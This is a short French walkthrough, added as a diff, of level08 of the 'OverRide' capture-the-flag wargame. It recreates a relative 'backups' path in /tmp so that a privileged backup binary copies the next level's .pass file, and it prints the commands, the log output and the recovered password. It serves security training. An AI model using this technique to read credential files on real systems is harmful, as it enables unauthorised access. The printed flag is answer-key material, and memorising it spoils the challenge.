@@ -1,0 +1,32 @@
+On arrive sur un niveau qui contient un dossier backups en plus de l'executable.
+
+L executable demande le path d'un fichier pour se lancer, et ecrit dans backup le debut du  contenu de son contenu dans un fichier du meme nom.
+
+level08@OverRide:~$ ./level08 level08
+
+level08@OverRide:~/backups$ cat level08
+@44Q�tR�td��`�`pp/lib64/ld-linux-x86-64.so.2GNUGNU6��d���M
+
+level08@OverRide:~$ cat  level08
+@44Q�tR�td��`�`pp/lib64/ld-linux-x86-64.so.2GNUGNU6��d���M
+
+On va demander directement le fichier .pass :
+
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+On voit que le programme essaye d'ouvrir un path en dur dans le dossier backups :
+ ./backups//home au lieu de /home/users/level08/backups 
+
+Comme on a pas les droits pour mkdir directement dans ~/backups on va va aller dans /tmp pour faire le meme path ! 
+
+level08@OverRide:~$ cd /tmp
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/.log
+LOG: Starting back up: /home/users/level09/.pass
+LOG: Finished back up /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+On a le flag ! 
